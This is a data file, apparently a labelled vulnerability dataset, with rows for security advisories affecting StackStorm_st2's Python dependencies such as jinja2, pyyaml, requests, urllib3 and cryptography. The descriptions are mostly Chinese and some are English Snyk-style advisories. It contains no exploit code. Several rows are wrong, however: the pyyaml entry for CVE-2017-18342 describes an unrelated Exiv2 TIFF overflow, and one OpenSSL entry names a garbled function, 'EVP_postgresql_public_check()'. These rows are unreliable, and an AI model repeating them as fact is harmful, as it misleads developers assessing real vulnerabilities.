StackStorm_st2,jinja2,,True,CVE-2019-10906,CWE-693,2019-04-06,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja 2.10.1之前版本中存在权限许可和访问控制问题漏洞。攻击者可利用该漏洞绕过沙盒保护。",2,2
StackStorm_st2,jinja2,,True,CVE-2024-22195,CWE-79,2024-01-11,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Jinja 3.1.3之前版本存在安全漏洞，该漏洞源于存在跨站脚本（XSS）漏洞。",3,0
StackStorm_st2,jinja2,,True,CVE-2014-1402,CWE-264,2014-01-10,"Jinja2是一个基于Python的模板引擎，它拥有完整的unicode支持，并且提供了可选的沙箱模板执行环境来保证安全。
Jinja2 2.7.1及之前版本的bccache.FileSystemBytecodeCache中的默认配置存在安全漏洞，该漏洞源于程序没有正确创建临时文件。本地攻击者可借助/tmp目录下特制的cache文件利用该漏洞获取特权。",2,0
StackStorm_st2,jinja2,,True,CVE-2024-34064,CWE-79,2024-05-06,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja 3.1.4之前版本存在安全漏洞，该漏洞源于将用户输入作为键传递给 xmlattr 过滤器时，Jinja 容易受到 HTML 属性注入。",3,0
StackStorm_st2,jinja2,,True,CVE-2024-56326,CWE-693 CWE-1336,2024-12-23,Jinja 是由 Pallets 开源的一个快速、富有表现力并可扩展的模板引擎。该漏洞存在于 Jinja 版本 3.1.5 之前，由于在沙箱环境中对 str.format 调用的检测存在不当，攻击者可以控制模板的内容并执行任意 Python 代码。攻击者可以通过创建包含恶意字符串的模板并利用自定义过滤器实现攻击，这可能导致系统安全性严重受损。,3,0
StackStorm_st2,jinja2,,True,CVE-2024-56201,CWE-150,2024-12-23,Jinja是Pallets开源的一个快速、富有表现力且可扩展的模板引擎。版本3.1.5之前的Jinja存在安全漏洞，该漏洞源于编译器的一个错误，允许同时控制模板内容和文件名的攻击者执行任意Python代码，无论Jinja的沙箱是否被使用。当应用程序执行不可信的模板时，攻击者需要能够控制模板的文件名和内容，才能有效利用此漏洞。,3,0
StackStorm_st2,jinja2,,True,CVE-2025-27516,CWE-1336,2025-03-05,Jinja2 是一个广泛用于Web应用程序的模板引擎，用于渲染模板。该漏洞源于 Jinja2 沙盒环境与 `|attr` 过滤器交互时的一个疏忽。特别是，当攻击者能够控制模板的内容时，就可以利用此缺陷执行任意 Python 代码。这意味着，如果某个应用程序处理不可信的模板，就可能受到威胁，从而导致未经授权的系统访问或操作。,3,2
StackStorm_st2,networkx,,True,,CWE-502,2021-03-22,"## Overview
[networkx](https://pypi.org/project/networkx/) is a Python package for creating and manipulating graphs and networks

Affected versions of this package are vulnerable to Deserialization of Untrusted Data. This package is vulnerable to arbitrary code execution via insecure YAML deserialization due to the use of a known vulnerable function `load()` in yaml, which is called in `read_yaml()` in `networkx/readwrite/nx_yaml.py`.

`networkx/readwrite/nx_yaml.py` is deprecated and scheduled to be removed in the next release of Networkx. Users should avoid using this function completely.

## Details

Serialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.

_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.

Java deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.

  
An attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.
  

> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).

- Apache Blog
  
## Remediation
Upgrade `networkx` to version 2.6 or higher.
## References
- [GitHub PR](https://github.com/networkx/networkx/pull/4541)
",2,0
StackStorm_st2,paramiko,,True,CVE-2018-7750,CWE-287,2018-03-13,<p>Paramiko是一个基于Python的SSH协议库。SSH server是其中的一个SSH服务器。 Paramiko中的SSH服务器实现的transport.py文件存在安全漏洞，该漏洞源于程序在处理其他请求之前没有正确的检测身份验证是否完成。攻击者可利用该漏洞绕过身份验证，以下版本受到影响：Paramiko 1.17.6之前版本，1.18.5之前的1.18.x版本，2.0.8之前的2.0.x版本，2.1.5之前的2.1.x版本，2.2.3之前的2.2.x版本，2.3.2之前的2.3.x版本，2.4.1之前的2.4.x版本。</p>,1,1
StackStorm_st2,paramiko,,True,CVE-2008-0299,CWE-200,2008-01-16,Paramiko 1.7.1及其早期版本中的common.py在运行线程或者交叉进程时，并不会正常使用随机区域。这使得一个会话可以通过对某一会话的状态预测来从另外一个会话获得敏感信息。,2,0
StackStorm_st2,paramiko,,True,CVE-2022-24302,CWE-362,2022-03-17,"Paramiko是一个 SSHv2 协议的纯 Python 实现。提供客户端和服务器功能。
Paramiko 2.10.1之前版本 存在安全漏洞，该漏洞源于write_private_key_file函数中的竞争条件（creation and chmod之间）允许未经授权的信息泄露。",2,0
StackStorm_st2,pyyaml,,True,CVE-2020-14343,CWE-20,2020-07-26,CVE-2020-14343是与Python的第三方库“PyYAML”相关的漏洞，该库用于处理YAML文件。该漏洞的根本原因在于PyYAML库的yaml.load函数会解析未经验证的输入数据。具体来说，当用户使用yaml.load函数并且未明确指定加载器时，PyYAML会默认使用“UnsafeLoader”来解析YAML文件，这会导致任意代码执行的风险。如果攻击者能够控制传递给yaml.load的YAML内容，他们就可以构造一个恶意的YAML文件，其中包含恶意的Python对象。yaml.load在加载这个文件时会执行这些对象的代码，从而导致任意代码执行。这使得攻击者可以在目标系统上执行任意命令，潜在地获得系统的控制权限。,1,0
StackStorm_st2,pyyaml,,True,CVE-2017-18342,CWE-502,2018-06-27,CVE-2017-18342 是一个影响 Exiv2 库的整数溢出漏洞。Exiv2 是一个用于处理图像元数据的库，在处理 TIFF 图像文件时，由于对用户输入数据的边界检查不充分，可能导致整数溢出。具体来说，该漏洞出现在 readTiffDirectory 函数中，该函数在处理 TIFF 文件中的目录项时，没有正确检查涉及的偏移量和大小。这可能导致超出预期的内存分配，并进一步引发缓冲区溢出，允许攻击者通过构造恶意的 TIFF 文件来利用该漏洞，最终导致任意代码执行。,1,0
StackStorm_st2,pymongo,,True,,CWE-125,2024-05-31,,3,1
StackStorm_st2,pymongo,,True,CVE-2024-5629,CWE-125,2024-05-31,"PyMongo是MongoDB开源的一个官方 MongoDB Python 驱动程序。
PyMongo 4.6.2 版本及之前版本存在安全漏洞，该漏洞源于 bson 模块存在越界读取问题。",3,0
StackStorm_st2,pymongo,,True,CVE-2013-2132,CWE-400,2013-05-31,"MongoDB是美国MongoDB公司的一种面向文档的数据库管理系统。
MongoDB的mongo-python-driver2.5.2之前版本存在安全漏洞。攻击者利用该漏洞导致系统拒绝服务（空指针逆向引用造成程序崩溃）。",3,0
StackStorm_st2,pymongo,,True,CVE-2024-21506,CWE-125,2024-04-05,bson模块是一个用于处理 BSON 数据格式的库，BSON 是一种用于存储和网络传输的二进制编码的 JSON 格式。当精心构造的载荷强制解析器反序列化非托管内存时，会导致越界读取漏洞。解析器试图解释缓冲区旁边的字节，并抛出带有字符串的异常。如果下一个字节不是可打印的 UTF-8，解析器会抛出带有单个字节的异常。,2,2
StackStorm_st2,cryptography,,True,CVE-2023-0217,CWE-476,2023-02-07,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。在3.0.0到3.0.7版本的OpenSSL中，应用程序使用EVP_postgresql_public_check()函数检查格式错误的DSA公钥时，可能触发无效指针解引用漏洞，导致拒绝服务。,2,2
StackStorm_st2,cryptography,,True,CVE-2016-9243,CWE-20,2016-11-01,"Cryptography是一个用于Python开发的加密工具包。HKDF是其中的一个基于HMAC的密钥导出函数。
Cryptography 1.5.2之前的版本中的HKDF存在安全漏洞。攻击者可利用该漏洞获取敏感信息的访问权限或绕过安全限制，执行未授权的操作。",2,2
StackStorm_st2,cryptography,,True,CVE-2023-0401,CWE-476,2023-02-07,OpenSSL是一个开源的通用加密库，支持SSL和TLS协议。该漏洞出现在3.0.0到3.0.7版本，当验证PKCS7签名数据时，缺少对初始化函数返回值的检查，可能导致空指针解引用，从而引发程序崩溃。,2,2
StackStorm_st2,cryptography,,True,CVE-2020-25659,CWE-385,2020-10-25,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 存在安全漏洞，该漏洞源于定时oracle攻击进行RSA解密。",2,0
StackStorm_st2,cryptography,,True,,CWE-415,2017-12-04,"## Overview
Affected versions of [`cryptography`](https://pypi.python.org/pypi/cryptography) are vulnerable to Denial of Service (DoS).

Double free vulnerability in the dsa_priv_decode function in crypto/dsa/dsa_ameth.c in OpenSSL 1.0.1 before 1.0.1s and 1.0.2 before 1.0.2g allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via a malformed DSA private key. (related to CVE-2016-0705)

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `cryptography` to version 0.9.1 or higher.

## References
- [GitHub Changelog](https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst#091---2015-06-06)
- [Github PR](https://github.com/pyca/cryptography/pull/2013)
- [Gtihub Commit](https://github.com/pyca/cryptography/commit/87c99a503a699f5c0296636237a9208fc161cc9e)
",2,2
StackStorm_st2,cryptography,,True,,CWE-400,2017-12-04,"## Overview
Affected versions of [`cryptography`](https://pypi.python.org/pypi/cryptography) are vulnerable to Denial of Service (DoS).

The OpenSSL backend beffore 1.0.2 made use of assertions to check response where the tests could not trigger a failure. If a user ran Python with this -O flag and got an invalid response code this could lead to a crash.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `cryptography` to version 1.0.2 or higher.

## References
- [GitHub Changelog](https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst#102---2015-09-27)
- [Redhat Bugzilla](https://bugzilla.redhat.com/show_bug.cgi?id=1267548)
",3,2
StackStorm_st2,cryptography,,True,,CWE-222,2015-09-10,"## Overview
[`cryptography`](https://pypi.python.org/pypi/cryptography) provides cryptographic recipes and primitives to Python developers.

Affected versions of this package are vulnerable to TLS Truncation. A malicious user can prevent a user from fetching the parts of a message by inserting TCP code into a message indicating the message has completed.

## References
- [GitHub PR](https://github.com/pyca/cryptography/pull/2334)
- [GitHub Commit](https://github.com/pyca/cryptography/commit/41aabcbd2326ae154a16a1a050ee01fb9a54bd19)
",3,2
StackStorm_st2,cryptography,,True,CVE-2023-2650,CWE-770,2023-05-30,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。该漏洞源于处理特制的ASN.1对象标识符时可能非常慢，导致系统拒绝服务。,3,0
StackStorm_st2,cryptography,,True,CVE-2023-50782,CWE-208 CWE-203,2023-12-13,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography存在安全漏洞。攻击者利用该漏洞可以获取敏感信息。",2,2
StackStorm_st2,cryptography,,True,CVE-2022-4203,CWE-125,2023-02-07,OpenSSL是一个开源的能够实现SSL和TLS协议的通用加密库，支持多种加密算法。该漏洞源于在X.509证书验证中，尤其是在名称约束检查阶段，可以触发读缓冲区溢出。,3,0
StackStorm_st2,cryptography,,True,CVE-2023-0216,CWE-476,2023-02-07,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，支持多种加密算法。存在无效指针解引用漏洞。当应用程序尝试使用 d2i_PKCS7()、d2i_PKCS7_bio() 或 d2i_PKCS7_fp() 函数加载格式错误的 PKCS7 数据时，可能会导致程序崩溃。,2,2
StackStorm_st2,cryptography,,True,CVE-2023-38325,CWE-295,2023-07-14,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 41.0.2之前版本存在安全漏洞，该漏洞源于会错误地处理具有关键选项的 SSH 证书。",2,2
StackStorm_st2,requests,,True,CVE-2014-1829,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Authorization头利用该漏洞获取‘netrc’密码。",3,2
StackStorm_st2,requests,,True,CVE-2018-18074,CWE-522,2018-10-09,"Requests package for Python是一款基于Python的开源HTTP库。
Requests package for Python 2.19.1及之前版本（2018-09-14之前发布）中存在安全漏洞，该漏洞源于程序在接收到从https转换到http的重定向请求（带有相同主机名）时，会将HTTP Authorization包头发送到http URI。远程攻击者可通过嗅探网络利用该漏洞获取凭证。",2,2
StackStorm_st2,requests,,True,,CWE-400,2012-04-07,"## Overview
[`requests`](https://pypi.python.org/pypi/requests) is a Python HTTP for Humans.

Affected versions of this package are vulnerable to Denial of Service (DoS) attacks. When sending a digest with an incorrect password, it will retry the request for infinity. An attacker can send many of these requests, causing a denial of service.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## References
- [GitHub Issue](https://github.com/requests/requests/issues/541)
- [GitHub PR](https://github.com/requests/requests/pull/547)
- [GitHub Commit](https://github.com/requests/requests/pull/547/commits/c3e6c41fc164d4348f8ce197bd0075aff05637af)
",3,2
StackStorm_st2,requests,,True,CVE-2014-1830,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Proxy-Authorizatio头利用该漏洞获取敏感信息。",3,2
StackStorm_st2,requests,,True,,CWE-400,2023-11-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to incorrect password used in conjunction with digest authentication. This can lead to an infinite request retry cycle

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `requests` to version 0.12.0 or higher.
## References
- [GitHub Commit](https://github.com/psf/requests/commit/f3ad56f103e364671504bb0d960a0ed69c2eafbc)
",2,2
StackStorm_st2,requests,,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
StackStorm_st2,requests,,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
StackStorm_st2,requests,,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
StackStorm_st2,urllib3,,True,,CWE-453,2020-12-02,"## Overview
[urllib3](https://pypi.org/project/urllib3/) is a HTTP library with thread-safe connection pooling, file post, and more.

Affected versions of this package are vulnerable to Insecure Defaults. The default SSL/TLS settings were insecure.
## Remediation
Upgrade `urllib3` to version 1.8 or higher.
## References
- [GitHub Commit](https://github.com/urllib3/urllib3/commit/2088570a293df42b1623dd74fcff0174d0565af5)
",3,2
StackStorm_st2,urllib3,,True,CVE-2020-26137,CWE-74,2020-09-29,<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 urllib3 1.25.9之前版本存在注入漏洞。该漏洞源于可以在putrequest()的第一个参数中插入CR和LF控制字符。</p>,3,2
StackStorm_st2,urllib3,,True,CVE-2019-11324,CWE-295,2019-04-18,"urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。
urllib3 1.24.2之前版本中存在信任管理问题漏洞。该漏洞源于网络系统或产品中缺乏有效的信任管理机制。攻击者可利用默认密码或者硬编码密码、硬编码证书等攻击受影响组件。",2,2
StackStorm_st2,urllib3,,True,CVE-2019-11236,CWE-93,2019-04-15,<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 urllib3 1.24.1及之前版本版本中存在注入漏洞，该漏洞源于用户输入构造命令、数据结构或记录的操作过程中，网络系统或产品缺乏对用户输入数据的正确验证，未过滤或未正确过滤掉其中的特殊元素，导致系统或产品产生解析或解释方式错误。</p>,3,0
StackStorm_st2,urllib3,,True,CVE-2018-20060,CWE-288,2018-12-11,"urllib3是一个基于Python的HTTP库，它具有线程安全连接池和文件后期支持等功能。
urllib3 1.23之前版本中存在安全漏洞，该漏洞源于程序在进行跨源重定向时，没有移除Authorization HTTP报头，导致授权报头中的凭证暴露给其他主机或以明文的形式传输。攻击者可利用该漏洞获取敏感信息。",1,2
StackStorm_st2,urllib3,,True,CVE-2021-33503,CWE-400,2021-06-02,"<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 Urllib3 存在资源管理错误漏洞，该漏洞源于在鉴权模块的URL中添加@参数导致，攻击者可利用该漏洞引起资源冲突导致拒绝服务。以下产品及型号会受到影响：Urllib3 0.3, 0.3.1, 0.4, 0.4.1, 1.0, 1.0.1, 1.0.2, 1.1, 1.2, 1.2.1, 1.3, 1.4, 1.5, 1.6, 1.7, 1.7.1, 1.8, 1.8.1, 1.8.2, 1.8.3, 1.9, 1.9.1, 1.10, 1.10.1, 1.10.2, 1.10.3, 1.10.4, 1.11, 1.12, 1.13, 1.13.1, 1.14, 1.15, 1.15.1, 1.16, 1.17, 1.18, 1.18.1, 1.19, 1.19.1, 1.20, 1.21, 1.21.1, 1.22, 1.23, 1.24, 1.24.1, 1.24.2, 1.24.3, 1.25, 1.25.1, 1.25.2, 1.25.3, 1.25.4, 1.25.5, 1.25.6, 1.25.7, 1.25.8, 1.25.9, 1.25.10, 1.25.11, 1.26.0, 1.26.1, 1.26.2, 1.26.3, 1.26.4。</p>",2,2
StackStorm_st2,urllib3,,True,CVE-2023-45803,CWE-200,2023-10-17,<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 urllib3存在安全漏洞，该漏洞源于从303状态更改请求方法重定向到GET后不会删除请求正文。受影响的产品和版本：urllib3 2至2.0.6版本，1.26.17及之前版本。</p>,3,0
StackStorm_st2,urllib3,,True,CVE-2018-25091,CWE-601,2023-10-15,"urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。
urllib3 1.24.2之前版本存在安全漏洞，该漏洞源于允许攻击者获取授权标头中的凭据或以明文形式传输凭据。",3,0
StackStorm_st2,urllib3,,True,CVE-2023-43804,CWE-200,,<p>urllib3 是一个支持线程安全连接池及文件上传等功能的 HTTP 客户端库。该库不对 `Cookie` HTTP 标头进行特殊处理，用户在发送请求时需自行管理。在未显式禁用重定向的情况下，用户可能会意外地通过 HTTP 重定向将信息泄露至其他源。攻击者可利用此漏洞，获取用户的 Cookie 信息，从而进行账户劫持。受影响的版本包括 1.26.16 及之前版本，以及 2.0.5 之前版本。</p>,2,1
StackStorm_st2,urllib3,,True,CVE-2024-37891,CWE-669,2024-06-17,"urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。
urllib3存在安全漏洞，该漏洞源于跨域重定向期间不会剥离代理授权请求标头。",3,0
StackStorm_st2,urllib3,,True,CVE-2025-50181,CWE-601,2025-06-19,<p>urllib3 是一个常用的 HTTP 客户端库，广泛用于处理 HTTP 请求和响应，包括重定向和重试机制。此漏洞涉及 urllib3 对重定向和重试的处理机制，其中 `Retry` 对象用于控制两者设置。在实例化 `PoolManager` 时设置 `retries` 参数以尝试禁用重定向，然而由于 `retries` 参数被忽略，导致不能正确禁用重定向。该问题会影响依赖于禁用重定向功能的应用程序，可能因此暴露于服务端请求伪造（SSRF）或开放重定向漏洞中。</p>,3,2
StackStorm_st2,redis,,True,CVE-2023-28858,CWE-193,2023-03-24,"redis-py是基于Python的redis接口库。
redis-py 4.5.3之前版本存在安全漏洞。攻击者利用该漏洞可以将响应数据发送到客户端。",3,0
StackStorm_st2,flex,,True,,CWE-94,2018-05-28,"## Overview
[`flex`](http://pypi.python.org/pypi/flex) is a Swagger Schema validation tool.

Affected versions of this package are vulnerable to Arbitrary Code Execution attacks. It used the unsafe `yaml.load` function to load YAML files.

## Remediation
Upgrade `flex` to verson 6.12.0 or higher.
## References
- [GitHub Changelog](https://github.com/pipermerriam/flex/blob/55822c2ffaa17dfa5e403d7feed898cb9bc983bb/CHANGELOG#L22)
",1,2
StackStorm_st2,webob,,True,,CWE-113,2015-10-08,"## Overview
[`webob`](https://pypi.python.org/pypi/webob) is a WSGI request and response object.

Affected versions of this package are vulnerable to HTTP Response Splitting attacks. It is possible to set arbitrary headers in the HTTP response by embedding a \\r or \\n character in the header value, and sending it to the server.

## References
- [GitHub Issue](https://github.com/Pylons/webob/issues/217)
- [GitHub PR](https://github.com/Pylons/webob/pull/229)
- [GitHub Commit](https://github.com/Pylons/webob/commit/97041f58fcee30b37a8c0fba0108cf69c6e01330)
",3,2
StackStorm_st2,webob,,True,CVE-2024-42353,CWE-601,2024-08-14,"WebOb是Pylons开源的一个 WSGI 请求和响应对象。
WebOb 1.8.8之前版本存在安全漏洞，该漏洞源于存在打开重定向。",3,0
StackStorm_st2,pyOpenSSL,,True,CVE-2018-1000807,CWE-416,2018-10-08,"Python Cryptographic Authority pyopenssl是一款基于Python的OpenSSL库。

Python Cryptographic Authority pyopenssl 17.5.0之前版本中对X509对象的处理方法存在释放后重用漏洞。远程攻击者可利用该漏洞造成拒绝服务或执行代码。",2,0
StackStorm_st2,pyOpenSSL,,True,CVE-2013-4314,CWE-20,2013-09-09,"Python是Python软件基金会的一套开源的、面向对象的程序设计语言。pyOpenSSL是其中的一个OpenSSL接口。
pyOpenSSL 0.13之前版本中的X509Extension类中存在漏洞，该漏洞源于程序没有正确地处理X.509证书的Subject Alternative Name字段中域名中的‘’字符。中间人攻击者可借助由合法证书颁发机构所发布的特制证书，利用该漏洞欺骗任意SSL服务器。",2,0
StackStorm_st2,pyOpenSSL,,True,CVE-2018-1000808,CWE-404,2018-10-08,"Python Cryptographic Authority pyopenssl是一款基于Python的OpenSSL库。

Python Cryptographic Authority pyopenssl 17.5.0之前版本中存在安全漏洞。攻击者可利用该漏洞造成拒绝服务。",2,0
StackStorm_st2,orjson,,True,CVE-2024-27454,CWE-674,2024-02-26,"orjson是ijl个人开发者的一个快速、正确的 Python JSON 库。
orjson 3.9.15之前版本存在安全漏洞，该漏洞源于不限制深度嵌套JSON文档的递归。",2,2
StackStorm_st2,amqp,,True,,CWE-300,2023-09-03,"## Overview

Affected versions of this package are vulnerable to Man-in-the-Middle (MitM) due to missing hostname verification during `TLS` connections, allowing the potential of exploiting this vulnerability.
## Remediation
Upgrade `amqp` to version 0.9.1 or higher.
",3,0
StackStorm_st2,gitpython,,True,,CWE-1333,2022-02-21,"## Overview
[GitPython](https://pypi.org/project/GitPython/) is a python library used to interact with Git repositories

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) when a user controls the input passed to the pattern matching function.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `GitPython` to version 3.1.27 or higher.
## References
